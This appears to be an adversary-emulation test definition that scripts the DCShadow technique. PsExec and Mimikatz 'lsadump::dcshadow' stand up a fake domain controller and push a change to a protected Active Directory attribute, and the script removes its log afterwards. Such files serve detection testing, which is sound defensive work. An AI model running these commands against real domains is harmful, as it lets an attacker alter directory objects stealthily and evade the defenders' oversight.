api_version: "2.0"
name: DCShadow (Active Directory)
description: |
    Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.

    [DCShadow](https://www.dcshadow.com/)
    [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)

    It will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:
    Get-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount

    Need SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.
    The easiest is to run elevated and as a Domain Admin user.
args:
    - name: value
      type: string
      default: "9999"
    - name: mimikatz_path
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe
    - name: psexec_path
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\PSTools\PsExec.exe
    - name: object
      type: string
      default: bruce.wayne
    - name: attribute
      type: string
      default: badpwdcount
uuid: 0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1207: Rogue Domain Controller'
requirements:
    platforms:
        - os: windows
steps:
    - name: dcshadow-(active-directory)
      inline: |
        # starting fake DC server, as SYSTEM (required)
        $dc_output_file = "PathToAtomicsFolder\..\ExternalPayloads\art-T1207-mimikatz-DC.log"
        Remove-Item $dc_output_file -ErrorAction Ignore
        $mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:{{.Args.object}} /attribute:{{.Args.attribute}} /value:{{.Args.value}}`" `"exit`""
        $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c '{{.Args.psexec_path}}' /accepteula -d -s {{.Args.mimikatz_path}} $mimikatzParam"

        # wait for fake DC server to be ready...
        Start-Sleep -Seconds 5

        # server ready, so trigger replication (push) and wait until it finished
        & "{{.Args.mimikatz_path}}" "lsadump::dcshadow /push" "exit"

        Write-Host "`nWaiting for fake DC server to return"
        Wait-Process $dc

        Write-Host "`nOutput from fake DC server:"
        Get-Content $dc_output_file
        Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
        Remove-Item $dc_output_file -ErrorAction Ignore

        Write-Host "End of DCShadow"
      executor: powershell
      cleanup:
        inline: |
            Stop-Process -Name "mimikatz" -Force -ErrorAction Ignore
        executor: powershell
